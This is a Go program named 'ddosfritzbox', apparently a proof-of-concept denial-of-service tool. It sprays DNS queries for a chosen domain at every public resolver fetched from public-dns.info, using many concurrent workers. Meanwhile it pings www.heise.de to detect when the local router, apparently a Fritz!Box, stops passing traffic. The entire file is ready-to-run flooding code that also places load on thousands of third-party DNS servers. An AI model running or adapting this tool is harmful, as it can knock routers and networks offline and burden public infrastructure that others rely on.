// go build && ./ddosfritzbox www.heise.de 30

package main

import (
	"context"
	"encoding/csv"
	"fmt"
	"io"
	"net/netip"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	probing "github.com/prometheus-community/pro-bing"

	"golang.org/x/net/idna"

	"github.com/OWASP/Amass/v3/net/http"
	"github.com/phuslu/fastdns"
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Error, please supply domain name as first argument and number of worker " +
			"goroutines as second. Example: ./ddosfritzbox www.heise.de 30")
		os.Exit(1)
	}

	// basic parameters
	domainName := os.Args[1]
	domainNamePunycode, err := idna.Display.ToASCII(domainName)
	if err != nil {
		fmt.Println(err.Error())
	}

	numberOfWorkers, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("No integer: " + os.Args[2])
	}

	// create goroutines
	var wg sync.WaitGroup
	var buffer = make(chan string, numberOfWorkers)
	wg.Add(numberOfWorkers)
	for i := 0; i < numberOfWorkers; i++ {
		// start consumers / workers
		go func() {
			req, resp := fastdns.AcquireMessage(), fastdns.AcquireMessage()
			defer fastdns.ReleaseMessage(req)
			defer fastdns.ReleaseMessage(resp)

			req.SetRequestQustion(domainNamePunycode, fastdns.ParseType("A"), fastdns.ClassINET)

			for resolver := range buffer {
				client := &fastdns.Client{
					AddrPort:    netip.AddrPortFrom(netip.MustParseAddr(resolver), 53),
					ReadTimeout: 1 * time.Millisecond,
					MaxConns:    100,
				}

				client.Exchange(req, resp)
			}
			wg.Done()
		}()
	}

	// fetch resolvers
	resolvers, _ := GetPublicDNSResolvers()
	fmt.Printf("Resolving with %d workers against %d nameservers\n", numberOfWorkers, len(resolvers))

	start := time.Now()

	// start Pinger
	go Pinger()

	// produce work for consumers
	for _, res := range resolvers {
		buffer <- res
	}

	// wait for workers to finish
	close(buffer)
	wg.Wait()

	elapsed := time.Since(start)
	fmt.Printf("\nTime elapsed: %s\nRequests per Second: %f\n", elapsed, float64(len(resolvers))/elapsed.Seconds())
}

// code adapted from amass
// (https://github.com/owasp-amass/amass/blob/3db54dac3d7358d69075cf34e3c29ee0cbfcfc5a/config/resolvers.go)
func GetPublicDNSResolvers() ([]string, error) {
	var PublicResolvers []string
	var r *csv.Reader
	f, err := os.Open("nameservers-all.csv")
	if err != nil {
		// fetch resolvers from internet
		url := "https://public-dns.info/nameservers-all.csv"
		fmt.Println("Fetching nameservers from " + url)
		resp, err := http.RequestWebPage(context.Background(), &http.Request{URL: url})
		if err != nil || resp.StatusCode < 200 || resp.StatusCode >= 400 {
			return nil, fmt.Errorf("failed to obtain the Public DNS csv file at %s: %v", url, err)
		}
		r = csv.NewReader(strings.NewReader(resp.Body))
	} else {
		// fetched resolvers from local file
		fmt.Println("Fetching nameservers from local file " + f.Name())
		defer f.Close()
		r = csv.NewReader(f)
	}
	var ipIdx int
	for i := 0; ; i++ {
		record, err := r.Read()
		if err == io.EOF {
			break
		}
		if err != nil {
			continue
		}
		if i == 0 {
			for idx, val := range record {
				if val == "ip_address" {
					ipIdx = idx
				}
			}
			continue
		}
		PublicResolvers = append(PublicResolvers, record[ipIdx])
	}

	return PublicResolvers, nil
}

func Pinger() {
	dest := "www.heise.de"
	pinger, err := probing.NewPinger(dest)
	if err != nil {
		panic(err)
	}
	pinger.Count = 1
	pinger.Timeout = time.Millisecond * 200

	// endless loop
	for {
		err = pinger.Run() // Blocks until finished.
		if err != nil {
			panic(err)
		}
		//stats := pinger.Statistics()
		//fmt.Println(stats)
		if pinger.Statistics().PacketsRecv != 1 {
			fmt.Println("ping failed")
		}

		time.Sleep(1 * time.Second)
		fmt.Printf(".")
	}
}
